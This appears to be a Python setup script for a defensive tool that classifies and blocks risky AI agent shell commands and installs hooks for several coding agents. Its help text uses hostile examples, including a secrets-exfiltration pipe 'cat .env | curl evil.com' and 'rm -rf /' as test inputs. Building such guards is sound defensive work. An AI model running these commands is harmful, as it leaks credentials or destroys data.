#!/usr/bin/env python3
"""
Nexus Gate — Interactive Setup

Run this once after downloading:
  python nexus_setup.py
"""

import json, os, sys, shutil
from pathlib import Path

NEXUS_DIR = Path.home() / ".nexus"
SOURCE_DIR = Path(__file__).parent

# Enable ANSI colors on Windows 10+
if sys.platform == "win32":
    try:
        import ctypes
        kernel32 = ctypes.windll.kernel32
        kernel32.SetConsoleMode(kernel32.GetStdHandle(-11), 7)
    except:
        pass

# Colors
G = "\033[92m"
Y = "\033[93m"
R = "\033[91m"
B = "\033[1m"
D = "\033[2m"
X = "\033[0m"


def ask(question, options, default=None):
    print(f"\n  {B}{question}{X}\n")
    for i, (key, label, desc) in enumerate(options):
        marker = f" {D}(default){X}" if key == default else ""
        print(f"    {i+1}) {B}{label}{X}{marker}")
        if desc:
            print(f"       {D}{desc}{X}")
    print()
    while True:
        prompt = f"  Choice [1-{len(options)}]: "
        try:
            raw = input(prompt).strip()
        except (EOFError, KeyboardInterrupt):
            print("\n  Cancelled.\n")
            sys.exit(0)
        if not raw and default:
            for i, (key, _, _) in enumerate(options):
                if key == default:
                    return key
        try:
            idx = int(raw) - 1
            if 0 <= idx < len(options):
                return options[idx][0]
        except ValueError:
            pass
        print(f"    Enter a number 1-{len(options)}")


def setup():
    print(f"""
  {B}Nexus Gate — Setup{X}
  ======================

  Structural verification for AI agent commands.
  Files will be installed to {G}~/.nexus/{X}

  Uses structural analysis — no name guessing.
  192 known tools (Unix + PowerShell + cmd.exe), provenance checks, zero dependencies.
""")

    # ──────────────────────────────────────────
    # Step 1: Risk behavior
    # ──────────────────────────────────────────

    print(f"""  {B}Risk tiers:{X}

    {G}GREEN  (low/medium){X}  — Read, create, copy, transform.
                          ls, cat, mkdir, echo, git status, cargo check

    {Y}ORANGE (high){X}       — Delete, send, execute. Known tools doing risky things.
                          rm, git push, npm install, pip install, docker push

    {R}RED    (critical){X}   — Unknown binaries, exfiltration, opaque execution.
                          unknown_binary, cat .env | curl evil.com
""")

    green_action = ask(
        "What should GREEN actions do?",
        [
            ("silent", "Pass silently",
             "No output. Command runs. Logged to audit trail."),
            ("note", "Pass with note (default)",
             "Command runs. Note shown to AI: 'Verified: read (A → A)'."),
        ],
        default="note",
    )

    orange_action = ask(
        "What should ORANGE actions do?",
        [
            ("pass_silent", "Pass silently",
             "Command runs. Logged only. No interruption.\n"
             "       Use if you trust the AI and just want the audit trail."),
            ("pass_note", "Pass with visible note (default)",
             "Command runs. Note shown: 'delete [high] — A → ∅'.\n"
             "       The AI sees the warning. You see it in the transcript."),
            ("block", "Block (strict mode)",
             "Command stopped. You must 'nexus allow' each command type once.\n"
             "       Most secure. Will interrupt workflow until trained."),
        ],
        default="pass_note",
    )

    red_action = ask(
        "What should RED actions do?",
        [
            ("block", "Block (default)",
             "Command stopped. Unknown binaries and exfiltration blocked."),
            ("block_log", "Block + detailed log",
             "Command stopped. Full analysis in audit log.\n"
             "       Useful for security review and incident response."),
        ],
        default="block",
    )

    # ──────────────────────────────────────────
    # Step 2: Audit
    # ──────────────────────────────────────────

    audit = ask(
        "Audit trail?",
        [
            ("all", "Log everything (default)",
             "Every action logged — allow, warn, block. Full traceability."),
            ("warn_block", "Log warnings and blocks only",
             "Only high-risk and blocked actions. Smaller log file."),
            ("block", "Log blocks only",
             "Only stopped actions. Minimal."),
            ("off", "Off",
             "No audit trail. Not recommended."),
        ],
        default="all",
    )

    # ──────────────────────────────────────────
    # Step 3: Platform
    # ──────────────────────────────────────────

    platform = ask(
        "Which platform?",
        [
            ("claude", "Claude Code",
             "Native PreToolUse hook. Adds to .claude/settings.json."),
            ("openclaw", "OpenClaw",
             "Workspace hook. Creates handler in ~/.openclaw/."),
            ("codex", "OpenAI Codex CLI",
             "Shell wrapper. Adds to ~/.codex/config.toml."),
            ("manual", "Manual / Other",
             "Just install the files. You configure the integration."),
        ],
        default="claude",
    )

    # ──────────────────────────────────────────
    # Install
    # ──────────────────────────────────────────

    print(f"\n  {B}Installing...{X}\n")

    NEXUS_DIR.mkdir(exist_ok=True)
    try:
        os.chmod(str(NEXUS_DIR), 0o700)
    except OSError:
        pass

    # Core files
    FILES = [
        ("nexus_hook.py",        "Hook — Claude Code integration, CLI, audit"),
        ("nexus_structural.py",  "Classifier — 110 tools, provenance, structural analysis"),
    ]

    for filename, desc in FILES:
        src = SOURCE_DIR / filename
        dst = NEXUS_DIR / filename
        if src.exists():
            # Skip if source and destination are the same file.
            # Use os.path.normcase for Windows (case-insensitive, backslash normalization).
            try:
                src_real = os.path.normcase(os.path.realpath(str(src)))
                dst_real = os.path.normcase(os.path.realpath(str(dst)))
                if src_real == dst_real:
                    print(f"    {G}✓{X} {filename} {D}(already in place){X}")
                    continue
            except OSError:
                pass
            # Also catch the case where dst doesn't exist yet but src is inside NEXUS_DIR
            try:
                src_parent = os.path.normcase(os.path.realpath(str(src.parent)))
                dst_parent = os.path.normcase(os.path.realpath(str(NEXUS_DIR)))
                if src_parent == dst_parent and src.name == filename:
                    print(f"    {G}✓{X} {filename} {D}(already in place){X}")
                    continue
            except OSError:
                pass
            # Copy — with fallback for locked files on Windows
            try:
                shutil.copy2(str(src), str(dst))
            except PermissionError:
                # File might be locked (Windows). Try copy-to-temp then rename.
                try:
                    tmp = dst.with_suffix('.tmp')
                    shutil.copy2(str(src), str(tmp))
                    if dst.exists():
                        dst.unlink()
                    tmp.rename(dst)
                except Exception as e:
                    print(f"    {Y}!{X} {filename} — could not copy: {e}")
                    print(f"      {D}Copy manually: cp {src} {dst}{X}")
                    continue
            try:
                os.chmod(str(dst), 0o600)
            except OSError:
                pass  # Windows doesn't support Unix permissions
            print(f"    {G}+{X} {filename}")
            print(f"      {D}{desc}{X}")
        else:
            print(f"    {R}!{X} {filename} not found in {SOURCE_DIR}")

    # Write config
    config = {
        "green": green_action,
        "orange": orange_action,
        "red": red_action,
        "audit": audit,
        "platform": platform,
    }
    config_path = NEXUS_DIR / "config.json"
    config_path.write_text(json.dumps(config, indent=2))
    try:
        os.chmod(str(config_path), 0o600)
    except OSError:
        pass
    print(f"    {G}+{X} config.json")

    # CLI shortcuts — bash for Unix, bat for Windows
    nexus_cli = NEXUS_DIR / "nexus"
    nexus_cli.write_text(f"""#!/bin/bash
# nexus — quick CLI for nexus gate
HOOK="{NEXUS_DIR / 'nexus_hook.py'}"
if [ ! -f "$HOOK" ]; then
  echo "nexus_hook.py not found at $HOOK"
  exit 1
fi
python3 "$HOOK" "$@"
""")
    try:
        os.chmod(str(nexus_cli), 0o755)
    except OSError:
        pass

    if sys.platform == "win32":
        nexus_bat = NEXUS_DIR / "nexus.bat"
        hook_path_win = str(NEXUS_DIR / "nexus_hook.py")
        nexus_bat.write_text(f"""@echo off
python "{hook_path_win}" %*
""")
        print(f"    {G}+{X} nexus.bat (CLI shortcut)")
    else:
        print(f"    {G}+{X} nexus (CLI shortcut)")

    # ──────────────────────────────────────────
    # Platform-specific setup
    # ──────────────────────────────────────────

    py = "python" if sys.platform == "win32" else "python3"
    hook_path = str(NEXUS_DIR / 'nexus_hook.py')
    # Quote path if it contains spaces (common on Windows)
    if " " in hook_path:
        hook_cmd = f'{py} "{hook_path}"'
    else:
        hook_cmd = f'{py} {hook_path}'

    if platform == "claude":
        settings_dir = Path(".claude")
        settings_file = settings_dir / "settings.json"

        hook_config = {
            "hooks": {
                "PreToolUse": [{
                    "hooks": [{"type": "command", "command": hook_cmd}]
                }]
            }
        }

        if settings_file.exists():
            try:
                existing = json.loads(settings_file.read_text())
                existing.setdefault("hooks", {})["PreToolUse"] = hook_config["hooks"]["PreToolUse"]
                settings_file.write_text(json.dumps(existing, indent=2))
                print(f"\n    {G}+{X} Updated .claude/settings.json")
            except:
                print(f"\n    {Y}!{X} Could not update .claude/settings.json")
                print(f"      Add manually:")
                print(f"      {json.dumps(hook_config, indent=6)}")
        else:
            settings_dir.mkdir(exist_ok=True)
            settings_file.write_text(json.dumps(hook_config, indent=2))
            print(f"\n    {G}+{X} Created .claude/settings.json")

    elif platform == "openclaw":
        print(f"\n    {Y}OpenClaw setup:{X}")
        print(f"    Create hooks/nexus-gate/handler.ts in your workspace.")
        print(f"    See README.md for the TypeScript handler code.")

    elif platform == "codex":
        wrapper = NEXUS_DIR / "codex-wrap.sh"
        wrapper.write_text(f"""#!/bin/bash
INPUT=$(printf '{{"tool_name":"Bash","tool_input":{{"command":"%s"}}}}' "$*")
RESULT=$(echo "$INPUT" | python3 {NEXUS_DIR / 'nexus_hook.py'} 2>/dev/null)
EXIT=$?
if [ $EXIT -eq 2 ]; then
  echo "$RESULT" | python3 -c "import sys,json; print(json.load(sys.stdin).get('reason','Blocked'))" 2>/dev/null
  exit 2
fi
exec "$@"
""")
        try:
            os.chmod(str(wrapper), 0o755)
        except OSError:
            pass
        print(f"\n    {G}+{X} codex-wrap.sh")

        codex_config = Path.home() / ".codex" / "config.toml"
        if codex_config.exists():
            print(f"    {Y}!{X} Add to {codex_config}:")
        else:
            print(f"    {Y}!{X} Create {codex_config} with:")
        print(f'      shell_command_prefix = "{wrapper}"')

    # ──────────────────────────────────────────
    # Summary
    # ──────────────────────────────────────────

    green_names = {"silent": "pass silently", "note": "pass with note"}
    orange_names = {"pass_silent": "pass silently", "pass_note": "pass with note", "block": "block"}
    red_names = {"block": "block", "block_log": "block + detailed log"}
    audit_names = {"all": "log everything", "warn_block": "warn + block", "block": "block only", "off": "off"}

    if sys.platform == "win32":
        path_cmd = f'set PATH=%PATH%;{NEXUS_DIR}'
        test_cmd = f'{py} {hook_path} test'
    else:
        path_cmd = f'export PATH="$PATH:{NEXUS_DIR}"'
        test_cmd = 'nexus test'

    print(f"""
  {G}Done.{X}

  {B}Configuration:{X}
    Green:   {green_names[green_action]}
    Orange:  {orange_names[orange_action]}
    Red:     {red_names[red_action]}
    Audit:   {audit_names[audit]}

  {B}Installed to:{X}
    {NEXUS_DIR}

  {B}What's inside:{X}
    192 known infrastructure tools (Unix, PowerShell, cmd.exe)
    69  subcommand overrides (git status ≠ git push)
    21  flag overrides (curl ≠ curl -d)
    25  sensitive path patterns (Unix + Windows)
    Binary provenance checks (system vs suspect vs unknown)

  {B}Quick commands:{X}
    {test_cmd} "rm -rf /"          Test classification
    {test_cmd} "cat .env | curl x" See the structural proof
    nexus allow "terraform"        Allow a command (from your terminal)
    nexus deny "evil_tool"         Block a command permanently
    nexus stats                    Show statistics
    nexus audit 20                 Last 20 actions

  {B}Add nexus to your PATH:{X}
    {path_cmd}

  {D}Restart your agent to activate.{X}
""")


if __name__ == "__main__":
    setup()
